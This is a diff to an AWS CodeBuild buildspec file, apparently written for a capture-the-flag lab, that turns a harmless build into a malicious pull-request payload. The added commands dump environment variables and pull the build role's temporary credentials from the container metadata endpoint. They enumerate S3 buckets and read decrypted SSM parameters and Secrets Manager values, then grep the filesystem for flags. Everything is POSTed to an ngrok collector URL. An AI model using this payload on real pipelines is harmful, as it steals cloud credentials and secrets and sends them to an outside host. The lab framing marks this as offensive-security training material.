@@ -1,8 +1,46 @@
 version: 0.2
 
+# Malicious PR payload for codebuild_lab_5_project (lab5).
+# Webhook builds arbitrary PRs from the PR-head buildspec -> runs as the project IAM role.
+# Exfil target = user's ngrok collector. One-shot (README warns reverse shells collide).
+
 phases:
   build:
     commands:
-      - echo "Running vulnerable training build"
-      - env | sort | head -n 20
+      - COLLECTOR="https://fa63-108-77-188-159.ngrok-free.app"
+
+      # 0) Env + identity (flag is sometimes injected as a build env var)
+      - env | sort > /tmp/env.txt 2>&1 || true
+      - aws sts get-caller-identity > /tmp/ident.txt 2>&1 || true
+
+      # 1) Leak the build role's temporary credentials
+      - curl -s "http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}" > /tmp/creds.json 2>&1 || true
+
+      # 2) Enumerate stores the role can reach
+      - aws s3 ls > /tmp/s3.txt 2>&1 || true
+      - aws ssm describe-parameters --query 'Parameters[].Name' --output text > /tmp/ssm.txt 2>&1 || true
+      - aws secretsmanager list-secrets --query 'SecretList[].Name' --output text > /tmp/secrets.txt 2>&1 || true
+
+      # 3) Hunt the flag directly (grep buckets/params/secrets/files for flag-ish content)
+      - |
+        {
+          echo "== s3 objects ==";
+          for b in $(aws s3api list-buckets --query 'Buckets[].Name' --output text 2>/dev/null); do
+            echo "# bucket $b"; aws s3 ls "s3://$b" --recursive 2>/dev/null | grep -iE 'flag|secret|ctf' || true;
+          done
+          echo "== ssm values ==";
+          for p in $(aws ssm describe-parameters --query 'Parameters[].Name' --output text 2>/dev/null); do
+            echo "# $p"; aws ssm get-parameter --name "$p" --with-decryption --query 'Parameter.Value' --output text 2>/dev/null || true;
+          done
+          echo "== secrets values ==";
+          for s in $(aws secretsmanager list-secrets --query 'SecretList[].Name' --output text 2>/dev/null); do
+            echo "# $s"; aws secretsmanager get-secret-value --secret-id "$s" --query 'SecretString' --output text 2>/dev/null || true;
+          done
+          echo "== local flag files ==";
+          grep -rIl -iE 'flag\{|HTB\{|FLAG' / 2>/dev/null | head -20;
+        } > /tmp/flaghunt.txt 2>&1 || true
+
+      # 4) Exfil everything to the collector
+      - for f in ident creds env s3 ssm secrets flaghunt; do curl -s -X POST "$COLLECTOR/$f" --data-binary "@/tmp/$f.txt" 2>/dev/null || curl -s -X POST "$COLLECTOR/$f" --data-binary "@/tmp/$f.json" 2>/dev/null || true; done
+
       - echo "Done"
